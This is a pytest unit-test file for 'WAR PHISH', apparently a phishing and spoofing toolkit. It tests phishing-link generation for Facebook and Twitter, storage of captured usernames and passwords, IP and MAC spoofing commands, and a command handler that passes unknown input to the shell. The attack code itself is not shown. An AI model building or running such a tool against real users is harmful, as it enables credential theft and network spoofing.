#!/usr/bin/env python3
"""
WAR PHISH - Unit Tests for Commands
"""

import pytest
import sys
import os
import json
import tempfile
from unittest.mock import Mock, patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from warphish import (
    CommandHandler, DatabaseManager, SpoofingEngine, PhishingServer,
    Colors, CONFIG_DIR, DATABASE_FILE
)


@pytest.fixture
def temp_db():
    """Create temporary database for testing"""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "test.db")
        db = DatabaseManager(db_path)
        yield db
        db.close()


@pytest.fixture
def command_handler(temp_db):
    """Create command handler with test database"""
    spoof_engine = SpoofingEngine(temp_db)
    phishing_server = PhishingServer(temp_db)
    handler = CommandHandler(temp_db, spoof_engine, phishing_server)
    return handler


class TestCommandHandler:
    """Test command handler functionality"""

    def test_help_command(self, command_handler):
        """Test help command"""
        result = command_handler.execute("help")
        assert result['success'] is True
        assert "WAR PHISH" in result['output']

    def test_status_command(self, command_handler):
        """Test status command"""
        result = command_handler.execute("status")
        assert result['success'] is True
        assert "System Status" in result['output']

    def test_time_command(self, command_handler):
        """Test time command"""
        result = command_handler.execute("time")
        assert result['success'] is True
        assert result['output'] is not None

    def test_date_command(self, command_handler):
        """Test date command"""
        result = command_handler.execute("date")
        assert result['success'] is True
        assert result['output'] is not None

    def test_clear_command(self, command_handler):
        """Test clear command"""
        result = command_handler.execute("clear")
        assert result['success'] is True

    def test_empty_command(self, command_handler):
        """Test empty command"""
        result = command_handler.execute("")
        assert result['success'] is False
        assert result['output'] == "Empty command"

    def test_invalid_command(self, command_handler):
        """Test invalid command (falls through to shell)"""
        result = command_handler.execute("nonexistentcommand123")
        # Should try to run as shell command
        assert 'success' in result

    def test_command_history(self, command_handler):
        """Test command history recording"""
        command_handler.execute("time")
        command_handler.execute("date")
        result = command_handler.execute("history 5")
        assert result['success'] is True
        assert "time" in result['output'] or "date" in result['output']


class TestPhishingCommands:
    """Test phishing-related commands"""

    def test_generate_phishing(self, command_handler):
        """Test phishing link generation"""
        result = command_handler.execute("generate_phishing facebook")
        assert result['success'] is True
        assert "Phishing link generated" in result['output']
        assert "facebook" in result['output'].lower()

    def test_generate_phishing_invalid_platform(self, command_handler):
        """Test invalid platform for phishing"""
        result = command_handler.execute("generate_phishing invalid")
        assert result['success'] is False
        assert "Available" in result['output']

    def test_generate_phishing_no_args(self, command_handler):
        """Test generate phishing without arguments"""
        result = command_handler.execute("generate_phishing")
        assert result['success'] is False

    def test_phishing_start_no_link(self, command_handler):
        """Test starting phishing without link ID"""
        result = command_handler.execute("phishing_start")
        assert result['success'] is False

    def test_phishing_links_empty(self, command_handler):
        """Test listing phishing links when empty"""
        result = command_handler.execute("phishing_links")
        assert result['success'] is True
        assert "No phishing links" in result['output']

    def test_phishing_status(self, command_handler):
        """Test phishing status command"""
        result = command_handler.execute("phishing_status")
        assert result['success'] is True
        assert "Stopped" in result['output'] or "Running" in result['output']


class TestNetworkCommands:
    """Test network-related commands"""

    @patch('subprocess.run')
    def test_ping_command(self, mock_run, command_handler):
        """Test ping command"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "PING google.com (142.250.185.46): 56 data bytes"
        mock_run.return_value = mock_result

        result = command_handler.execute("ping google.com")
        assert 'success' in result

    @patch('subprocess.run')
    def test_nmap_command(self, mock_run, command_handler):
        """Test nmap command"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "Nmap scan report for localhost (127.0.0.1)\n22/tcp open  ssh"
        mock_run.return_value = mock_result

        result = command_handler.execute("nmap localhost")
        assert 'success' in result

    def test_ping_no_args(self, command_handler):
        """Test ping without arguments"""
        result = command_handler.execute("ping")
        assert result['success'] is False
        assert "Usage:" in result['output']

    @patch('subprocess.run')
    def test_whois_command(self, mock_run, command_handler):
        """Test whois command"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "Domain Name: GOOGLE.COM"
        mock_run.return_value = mock_result

        result = command_handler.execute("whois google.com")
        assert 'success' in result

    @patch('subprocess.run')
    def test_dns_command(self, mock_run, command_handler):
        """Test DNS lookup command"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "142.250.185.46"
        mock_run.return_value = mock_result

        result = command_handler.execute("dns google.com")
        assert 'success' in result


class TestSpoofingCommands:
    """Test spoofing-related commands"""

    @patch('warphish.SpoofingEngine.spoof_ip')
    def test_spoof_ip_command(self, mock_spoof, command_handler):
        """Test IP spoofing command"""
        mock_spoof.return_value = {'success': True, 'output': 'Spoofing successful'}
        
        result = command_handler.execute("spoof_ip 192.168.1.1 10.0.0.1 192.168.1.100")
        assert result['success'] is True

    @patch('warphish.SpoofingEngine.spoof_mac')
    def test_spoof_mac_command(self, mock_spoof, command_handler):
        """Test MAC spoofing command"""
        mock_spoof.return_value = {'success': True, 'output': 'MAC changed'}
        
        result = command_handler.execute("spoof_mac eth0 00:11:22:33:44:55")
        assert 'success' in result

    def test_spoof_mac_no_args(self, command_handler):
        """Test MAC spoofing without arguments"""
        result = command_handler.execute("spoof_mac")
        assert result['success'] is False
        assert "Usage:" in result['output']

    @patch('warphish.SpoofingEngine.stop_spoofing')
    def test_stop_spoof_command(self, mock_stop, command_handler):
        """Test stop spoofing command"""
        mock_stop.return_value = {'success': True, 'output': 'Stopped spoofing'}
        
        result = command_handler.execute("stop_spoof")
        assert result['success'] is True


class TestCredentialsCommands:
    """Test credentials-related commands"""

    def test_credentials_empty(self, command_handler):
        """Test viewing credentials when empty"""
        result = command_handler.execute("credentials")
        assert result['success'] is True
        assert "No credentials captured" in result['output']

    def test_capture_credential(self, temp_db):
        """Test saving captured credential"""
        link_id = "test123"
        temp_db.save_phishing_link(link_id, "facebook", "http://localhost:8080")
        result = temp_db.save_captured_credential(
            link_id, "testuser", "testpass", "127.0.0.1", "TestAgent"
        )
        assert result is True

        creds = temp_db.get_captured_credentials()
        assert len(creds) >= 1
        assert creds[0]['username'] == "testuser"


class TestDatabaseManager:
    """Test database manager functionality"""

    def test_init_database(self, temp_db):
        """Test database initialization"""
        assert temp_db.conn is not None
        assert temp_db.cursor is not None

    def test_save_phishing_link(self, temp_db):
        """Test saving phishing link to database"""
        result = temp_db.save_phishing_link("link123", "facebook", "http://test.com")
        assert result is True

        links = temp_db.get_phishing_links()
        assert len(links) >= 1
        assert links[0]['id'] == "link123"

    def test_update_phishing_clicks(self, temp_db):
        """Test updating click count"""
        temp_db.save_phishing_link("link456", "twitter", "http://test.com")
        temp_db.update_phishing_clicks("link456")
        
        links = temp_db.get_phishing_links()
        for link in links:
            if link['id'] == "link456":
                assert link['clicks'] == 1

    def test_command_logging(self, temp_db):
        """Test command logging"""
        temp_db.log_command("test command", "local", "local", True, "output", 0.5)
        
        history = temp_db.get_command_history(10)
        assert len(history) >= 1

    def test_get_statistics(self, temp_db):
        """Test statistics gathering"""
        stats = temp_db.get_statistics()
        assert 'total_commands' in stats
        assert 'total_phishing_links' in stats

    def test_log_spoofing(self, temp_db):
        """Test spoofing logging"""
        temp_db.log_spoofing("ip", "1.1.1.1", "2.2.2.2", "target", True)
        
        # Verify by checking stats
        stats = temp_db.get_statistics()
        assert stats['total_spoofing'] >= 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])